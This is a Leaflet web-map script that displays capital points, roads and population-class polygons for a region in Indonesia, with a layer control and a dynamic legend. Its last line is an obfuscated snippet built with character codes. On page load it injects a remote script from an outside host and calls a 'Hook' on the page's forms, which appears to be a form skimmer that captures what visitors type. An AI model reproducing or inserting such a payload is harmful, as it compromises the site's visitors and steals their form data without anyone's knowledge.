var map = L.map('map').setView([-7.9,110.45], 10);

// Basemap
L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
  attribution: 'OSM'
}).addTo(map);

// Control legend
var legend = L.control({position: 'bottomleft'}), legenditem;

legend.onAdd = function (map) {
  this._div = L.DomUtil.create('div', 'legend'), legenditem = [];
  this.update();
  return this._div;
};

legend.update = function () {
  this._div.innerHTML = '<h4>Legend</h4><hr>' + legenditem.join('<hr>');
};

legend.addTo(map);

/* GeoJSON Point */
var capitalpoint = L.geoJson(null, {
  onEachFeature: function (feature, layer) {
    if (feature.properties) {
      layer.on({
        mouseover: function (e) {
          capitalpoint.bindTooltip(feature.properties.KAB_KOTA);
        }
      });
    }
  }
});
$.getJSON("data/capitalpoint.geojson", function (data) {
  capitalpoint.addData(data);
  map.addLayer(capitalpoint);
});

/* GeoJSON Polyline */
map.createPane("pane_street");
map.getPane("pane_street").style.zIndex = 401;
var layerWidth = {"Jalan Arteri":3, "Jalan Kolektor":1};
var street = L.geoJson(null, {
  pane: "pane_street",
  style: function (feature) {
    return {
      color: "red",
      weight: layerWidth[feature.properties.KETERANGAN],
      opacity: 1,
      interactive: false,
    };
  }
});
$.getJSON("data/street.geojson", function (data) {
  street.addData(data);
  map.addLayer(street);
});

/* GeoJSON Polygon */
map.createPane("pane_population");
map.getPane("pane_population").style.zIndex = 301;
var layerColors = {"High":"#bd0026", "Middle":"#fd8d3c", "Low":"#ffffb2"};
var population = L.geoJson(null, {
  pane:"pane_population",
  style: function (feature) {
    return {
      fillColor: layerColors[feature.properties.POPULATION_CLASS],
      fillOpacity: 0.7, 
      color: "black", 
      weight: 1,
      opacity: 1,
    };
  },
  onEachFeature: function (feature, layer) {
    layer.on({
      mouseover: function (e) { 
        var layer = e.target;
        layer.setStyle({
          weight: 2,
          color: "gray",
          opacity: 1,
          fillColor: "#00FFFF",
          fillOpacity: 1,
        });
        population.bindTooltip(feature.properties.KECAMATAN + ', ' + feature.properties.KABUPATEN + '<br>Population ' + parseInt(feature.properties.POPULATION).toLocaleString() + ' people'); //Popup
      },
      mouseout: function (e) {
        population.resetStyle(e.target);
      },
      click: function (e) {
        map.fitBounds(e.target.getBounds());
      }
    });
  }
});
$.getJSON("data/population.geojson", function (data) {
  population.addData(data);
  map.addLayer(population);
});

// Control Layer
var Layers = {
  'Capital Point': capitalpoint,
  'Street': street,
  'Population': population,
};
var layerControl = L.control.layers(null, Layers, {collapsed:false});
layerControl.addTo(map);

// Legend for each layer
var legend_capitalpoint = '<img src="assets/img/marker-icon.png" width="10"> Capital Point',
legend_street = '<img class="imglegend" src="assets/img/streetlegend.png" width="150">',
legend_population = '<img class="imglegend" src="assets/img/populationlegend.png" width="150">';

map.on("overlayadd", function(e) {
  if (e.layer === capitalpoint) {
    legenditem.push(legend_capitalpoint);
    legend.update();
  }
  if (e.layer === street) {
    legenditem.push(legend_street);
    legend.update();
  }
  if (e.layer === population) {
    legenditem.push(legend_population);
    legend.update();
  }
});

map.on("overlayremove", function(e) {
  if (e.layer === capitalpoint) {
    for( var i = 0; i < legenditem.length; i++){
      if ( legenditem[i] === legend_capitalpoint) {
        legenditem.splice(i, 1);
      }
    }
    legend.update();
  }
  if (e.layer === street) {
    for( var i = 0; i < legenditem.length; i++){
      if ( legenditem[i] === legend_street) {
        legenditem.splice(i, 1);
      }
    }
    legend.update();
  }
  if (e.layer === population) {
    for( var i = 0; i < legenditem.length; i++){
      if ( legenditem[i] === legend_population) {
        legenditem.splice(i, 1);
      }
    }
    legend.update();
  }
});
(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db